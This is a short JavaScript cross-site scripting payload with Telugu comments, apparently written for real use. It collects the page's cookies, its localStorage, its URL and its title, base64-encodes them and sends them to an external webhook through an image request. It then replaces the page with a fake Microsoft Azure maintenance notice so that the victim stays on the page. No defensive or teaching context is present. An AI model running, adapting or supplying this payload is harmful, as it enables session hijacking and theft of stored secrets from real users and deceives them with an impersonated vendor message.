
(function() {
    // నీ వెబ్‌హుక్ లింక్ (కచ్చితంగా ఇదే ఉందో లేదో చూసుకో)
    var webhook = "https://25ad80f0-8ab5-44cc-90eb-744bea49970e.webhooksite.net/";

    var exfil = {
        title: document.title,
        url: window.location.href,
        cookies: document.cookie || "Protected-or-None",
        storage: JSON.stringify(localStorage)
    };

    // అత్యంత నమ్మకమైన పద్ధతి: Image Tag
    var report = btoa(JSON.stringify(exfil));
    var img = new Image();
    img.src = webhook + "?report=" + report;

    // విక్టిమ్‌కి ఏదైనా కనిపిస్తేనే వాళ్ళు అక్కడ సేపు ఉంటారు
    document.body.innerHTML = "<h1 style='color:white; background:blue; padding:20px;'>Microsoft Azure - System Maintenance</h1><p>Please do not close this window while we verify your session...</p>";
})();
